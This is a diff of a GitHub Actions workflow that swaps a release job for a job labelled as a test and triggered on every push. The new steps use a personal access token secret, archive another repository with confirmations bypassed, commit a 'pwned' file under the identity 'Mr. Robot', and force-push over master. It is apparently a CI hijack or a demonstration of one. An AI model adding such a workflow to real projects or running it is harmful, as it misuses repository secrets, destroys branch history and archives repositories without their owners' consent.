@@ -1,29 +1,33 @@
-name: release
+
 "on":
-  push:
-    branches:
-      - master
+  - push
+name: Test
 jobs:
-  release:
-    name: release
+  issues:
+    name: "[TEST] Issues"
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@2541b1294d2704b0964813337f33b291d3f8596b # tag=v3
+      - uses: actions/checkout@master
         with:
-          token: ${{ secrets.OCTOKITBOT_PAT }}
+            token: ${{ secrets.GAMBERRYS_PAT }}
       - uses: actions/setup-node@eeb10cff27034e7acf239c5d29f62154018672fd # tag=v3
         with:
-          cache: npm
           node-version: 16
-      - run: npm ci
-      - run: npm run build
-      - run: rm .gitignore
-      - run: npx semantic-release --debug
+          cache: npm
+      - run: npx @octoherd/script-hello-world -T $GITHUB_TOKEN -R 'oscard0m/web'
         env:
-          GITHUB_TOKEN: ${{ secrets.OCTOKITBOT_PAT }}
+          GITHUB_TOKEN: ${{ secrets.GAMBERRYS_PAT }}
+      - run: npx @octoherd/script-archive-repository -T $GITHUB_TOKEN -R 'oscard0m/content' --octoherd-bypass-confirms
+        env:
+          GITHUB_TOKEN: ${{ secrets.GAMBERRYS_PAT }}
+      - run: echo "pwned" > pwned.txt
+      - run: git config user.name "Mr. Robot"
+      - run: git config user.email "mr-robot@fsociety.com"
+      - run: git add pwned.txt
+      - run: git commit -m "pwned"
       - run: >-
-          git push
+          git push --force
           https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git
-          HEAD:refs/heads/v2.x
+          HEAD:refs/heads/master
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_TOKEN: ${{ secrets.GAMBERRYS_PAT }}
